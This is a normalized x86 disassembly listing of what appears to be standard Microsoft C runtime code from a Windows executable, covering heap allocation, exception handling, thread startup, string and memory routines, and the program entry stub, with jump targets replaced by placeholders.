mov eax [ ebx ]
test eax eax
je r-xdata
and [ edi + 0x4 ] 0x0
push eax
call sub_418e20
mov esi eax
inc esi
push esi
call sub_415170
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
mov [ edi + 0x8 ] 0x1
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push [ ebx ]
push esi
push eax
call sub_418db8
add esp 0xc
jmp r-xdata
sub_414ff2
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] r--data
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
test eax eax
mov eax [ ebx + 0x4 ]
push edi
je r-xdata
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
jmp r-xdata
push eax
call sub_418e20
mov edi eax
inc edi
push edi
call sub_415170
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
push [ ebx + 0x4 ]
push edi
push eax
call sub_418db8
add esp 0xc
jmp r-xdata
sub_415072
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_41504f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40a5fb
pop ecx
sub_415093
push 0xc
push r--data
call sub_415ff4
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_416039
retn
cmp [ rw-data ] 0x3
jne r-xdata
push esi
push 0x4
call sub_419057
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_41908a
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
call sub_4162ac
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_41626a
mov [ esi ] eax
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4150e9
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push esi
push eax
call sub_4190ba
pop ecx
pop ecx
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
sub_415121
push 0xc
push r--data
call sub_415ff4
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp - 0x1c ]
call sub_416039
retn
push 0x4
call sub_419057
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_419869
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_415167
sub_415170
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_419d41
pop ecx
call sub_4162ac
mov [ eax ] 0xc
xor eax eax
push ebx
push edi
mov edi [ HeapAlloc@IAT ]
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
call sub_419cf9
push 0x1e
call sub_419b4e
push 0xff
call sub_4182e7
cmp eax 0x3
jne r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
push esi
call sub_415121
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
mov eax esi
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
inc esi
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
push [ rw-data ]
call edi
push eax
jmp r-xdata
pop edi
mov eax ebx
pop ebx
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
pop esi
pop ebp
retn
call sub_4162ac
mov [ eax ] esi
push [ ebp + 0x8 ]
call sub_419d41
pop ecx
test eax eax
je r-xdata
call sub_4162ac
mov [ eax ] esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
sub_41523a
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax edx
mov cx [ edx ]
inc edx
inc edx
test cx cx
jne r-xdata
dec edx
dec edx
cmp [ ebp + 0x10 ] 0x0
push esi
je r-xdata
xor ecx ecx
mov [ edx ] cx
mov esi [ ebp + 0xc ]
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
movzx ecx [ esi ]
dec [ ebp + 0x10 ]
mov [ edx ] cx
inc edx
inc edx
inc esi
inc esi
test cx cx
je r-xdata
sub_415289
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x328 ] 0x0
push ebx
push 0x4c
lea eax [ ebp - 0x324 ]
push 0x0
push eax
call sub_415f60
lea eax [ ebp - 0x328 ]
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x2d4 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x20c ] ecx
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x328 ] 0xc0000417
mov [ ebp - 0x324 ] 0x1
mov [ ebp - 0x31c ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov ebx eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push 0xc0000417
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_414a33
leave
retn
test ebx ebx
jne r-xdata
push 0x2
call sub_419d69
pop ecx
sub_4153b1
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_419dec
pop ecx
test eax eax
je r-xdata
push 0x2
call sub_419d69
pop ecx
pop ebp
jmp sub_415289
pop ebp
jmp eax
sub_4153e7
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
call sub_4162ac
push 0x16
pop esi
mov [ eax ] esi
pop edi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_415f60
add esp 0xc
cmp [ ebp + 0x10 ] edi
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_41a3c0
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_4162ac
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_4153b1
add esp 0x14
mov eax esi
jmp r-xdata
sub_415464
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_419ffc
test eax eax
je r-xdata
push r--data
call sub_41a7c0
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call [ ExitThread@IAT ]
push eax
call sub_41a1be
pop ecx
call [ r--data ]
sub_4154e2
mov edi edi
push ebp
mov ebp esp
push esi
call sub_419e87
call sub_419e81
push eax
call sub_419e67
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x54 ]
mov [ eax + 0x54 ] edx
mov edx [ ecx + 0x58 ]
mov [ eax + 0x58 ] edx
mov edx [ ecx + 0x4 ]
push ecx
mov [ eax + 0x4 ] edx
call sub_41a08f
mov esi [ ebp + 0x8 ]
push esi
call sub_419e81
push eax
call sub_419ebb
test eax eax
jne r-xdata
call sub_4154a1
push r--data
call sub_41a7c0
pop ecx
test eax eax
je r-xdata
call [ GetCurrentThreadId@IAT ]
mov [ esi ] eax
jmp r-xdata
call [ GetLastError@IAT ]
push eax
call [ ExitThread@IAT ]
call [ r--data ]
cmp [ r--data ] 0x0
je r-xdata
sub_415565
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp edi ebx
jne r-xdata
push esi
call sub_419e87
push 0x214
push 0x1
call sub_41aa23
mov esi eax
pop ecx
pop ecx
cmp esi ebx
je r-xdata
call sub_4162ac
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_4153b1
add esp 0x14
xor eax eax
jmp r-xdata
push esi
call sub_415093
pop ecx
cmp [ ebp - 0x4 ] ebx
je r-xdata
call sub_41a075
push [ eax + 0x6c ]
push esi
call sub_419f15
mov eax [ ebp + 0x14 ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi + 0x58 ] eax
mov eax [ ebp + 0x1c ]
pop ecx
pop ecx
mov [ esi + 0x54 ] edi
cmp eax ebx
jne r-xdata
pop edi
pop ebx
leave
retn
xor eax eax
push [ ebp - 0x4 ]
call sub_4162d2
pop ecx
push eax
push [ ebp + 0x18 ]
push esi
push sub_4154e2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CreateThread@IAT ]
cmp eax ebx
jne r-xdata
lea eax [ ebp + 0x10 ]
pop esi
call [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
sub_41563e
push 0x14
push r--data
call sub_415ff4
mov eax 0x5a4d
cmp [ __dos_header ] ax
jne r-xdata
and [ ebp - 0x1c ] 0x0
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
call sub_41a22c
test eax eax
jne r-xdata
push 0x1c
call sub_415615
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
call sub_41b1cb
and [ ebp - 0x4 ] 0x0
call sub_41af77
test eax eax
jge r-xdata
push 0x10
call sub_415615
cmp [ eax + r--data ] 0xe
jbe r-xdata
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_41ae40
mov [ rw-data ] eax
call sub_41ad85
test eax eax
jge r-xdata
push 0x1b
call sub_418293
pop ecx
xor ecx ecx
cmp [ eax + r--data ] ecx
setne cl
mov [ ebp - 0x1c ] ecx
jmp r-xdata
call sub_41ab0d
test eax eax
jge r-xdata
push 0x8
call sub_418293
pop ecx
push 0x1
call sub_418eab
pop ecx
test eax eax
jne r-xdata
push 0x1
call sub_418352
pop ecx
test eax eax
je r-xdata
push 0x9
call sub_418293
pop ecx
mov eax [ rw-data ]
mov [ rw-data ] eax
push eax
push [ rw-data ]
push [ rw-data ]
call sub_404150
add esp 0xc
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push eax
call sub_418293
pop ecx
call sub_41852f
jmp sub_415780
push eax
call sub_418503
sub_41579a
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41b2ad
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov eax esi
pop esi
leave
retn
cmp [ ebp - 0x4 ] eax
je r-xdata
call sub_4162ac
test eax eax
je r-xdata
call sub_4162ac
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
sub_4157da
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_415813
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_415867
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41bf9e
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_41589d
mov edi edi
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_414a33
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_41bf9e
add esp 0x20
pop esi
pop ebp
retn
sub_4158d0
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_4159a7
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_41a075
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_4159a7
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_414a33
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_41bf9e
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_4158d0
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_415813
pop ebx
leave
retn
sub_415a46
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp - 0x4 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax ecx
mov ecx [ ebp + 0x10 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_41c0d0
call sub_41c0d0
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_415abb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_41a075
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_41a075
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_415ae7
mov edi edi
push ebp
mov ebp esp
call sub_41a075
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
sub_415b0e
mov edi edi
push ebp
mov ebp esp
push esi
call sub_41a075
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_41a075
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_41a075
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
pop ebp
jmp sub_41c0d0
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax ecx
pop esi
pop ebp
retn
sub_415b60
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_41589d
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_41c120
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_415bc0
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_415bf3
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_415c29
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_415c5f
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_415cca
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_415d16
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
cmp [ ebp + 0x14 ] edi
jne r-xdata
cmp esi edi
je r-xdata
cmp esi edi
jne r-xdata
call sub_4162ac
push 0x16
pop esi
mov [ eax ] esi
mov ebx [ ebp + 0xc ]
cmp ebx edi
ja r-xdata
cmp [ ebp + 0xc ] edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx edi
jne r-xdata
xor eax eax
mov [ esi ] ax
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov eax esi
jne r-xdata
xor eax eax
mov [ esi ] ax
jmp r-xdata
movzx ecx [ edx ]
mov [ eax ] cx
inc eax
inc eax
inc edx
inc edx
cmp cx di
je r-xdata
movzx ecx [ edx ]
mov [ eax ] cx
inc eax
inc eax
inc edx
inc edx
cmp cx di
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
dec ebx
je r-xdata
cmp ebx edi
jne r-xdata
dec ebx
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec [ ebp + 0x14 ]
jne r-xdata
xor eax eax
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
jmp r-xdata
mov [ esi ] ax
call sub_4162ac
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ esi + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_4153b1
add esp 0x14
mov eax esi
jmp r-xdata
sub_415de9
push [ rw-data ]
call sub_419dec
pop ecx
test eax eax
je r-xdata
push 0x19
call sub_419b4e
push 0x1
push 0x0
call sub_41c283
add esp 0xc
jmp sub_41c16c
call eax
sub_415e13
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push [ rw-data ]
call sub_419dec
push [ rw-data ]
mov edi eax
mov [ ebp - 0x4 ] edi
call sub_419dec
mov esi eax
pop ecx
pop ecx
cmp esi edi
jb r-xdata
xor eax eax
mov ebx esi
sub ebx edi
lea eax [ ebx + 0x4 ]
cmp eax 0x4
jb r-xdata
push edi
call sub_417fca
mov edi eax
lea eax [ ebx + 0x4 ]
pop ecx
cmp edi eax
jae r-xdata
push [ ebp + 0x8 ]
call sub_419d71
mov [ esi ] eax
add esi 0x4
push esi
call sub_419d71
pop ecx
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
pop ecx
jmp r-xdata
mov eax 0x800
cmp edi eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax edi
cmp eax edi
jb r-xdata
mov eax edi
lea eax [ edi + 0x10 ]
cmp eax edi
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_41aa6f
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_41aa6f
pop ecx
pop ecx
test eax eax
je r-xdata
sar ebx 0x2
push eax
lea esi [ eax + ebx * 4 ]
call sub_419d71
pop ecx
mov [ rw-data ] eax
sub_415ecd
mov edi edi
push esi
push 0x4
push 0x20
call sub_41aa23
mov esi eax
push esi
call sub_419d71
add esp 0xc
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_415efe
push 0xc
push r--data
call sub_415ff4
call sub_4182ff
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_415e13
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_415f34
mov eax [ ebp - 0x1c ]
call sub_416039
retn
sub_415f60
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x100
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_41c30a
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_415fda
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
inc eax
inc eax
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_415ff4
push sub_416050
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_416050
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_414a33
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_414a33
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_41c4d8
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_41c48e
mov [ ebp - 0x1 ] 0x1
test eax eax
jl r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_414a33
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_414a33
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
